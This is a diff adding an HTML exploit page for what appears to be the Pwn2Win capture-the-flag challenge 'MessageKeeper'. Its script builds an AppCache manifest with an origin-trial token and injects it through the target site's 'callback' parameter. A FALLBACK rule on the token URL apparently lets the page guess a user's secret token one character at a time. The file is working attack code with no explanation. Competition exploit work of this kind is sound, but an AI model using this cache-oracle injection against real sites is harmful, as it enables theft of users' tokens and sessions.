@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Pwn2Win | MessageKeeper</title>
+	</head>
+<body>
+<script>
+
+let char = new URLSearchParams(location.search.substring(1)).get("char");
+
+let manifest = `CACHE MANIFEST
+CACHE:
+/?${char}
+
+FALLBACK:
+/user?token=${char} /static/background.png
+
+ORIGIN-TRIAL:
+Ai4ydiVubeyrG5ojmsmx4zXXRJHqir2J5uviVMDtaxxN4dythqlerla7pskdToaaKibhXDHG/ww1Gwt4keKDgAAAAABTeyJvcmlnaW4iOiJodHRwczovL21lc3NhZ2VrZWVwZXIueHl6OjQ0MyIsImZlYXR1cmUiOiJBcHBDYWNoZSIsImV4cGlyeSI6MTYzMzQ3ODM5OX0=
+#`;
+
+let html = `<html manifest="user?callback=${encodeURIComponent(manifest)}"><head></head></html>`;
+location = `https://messagekeeper.xyz/user?callback=${encodeURIComponent(html)}`;
+
+</script>
+</body>
+</html>
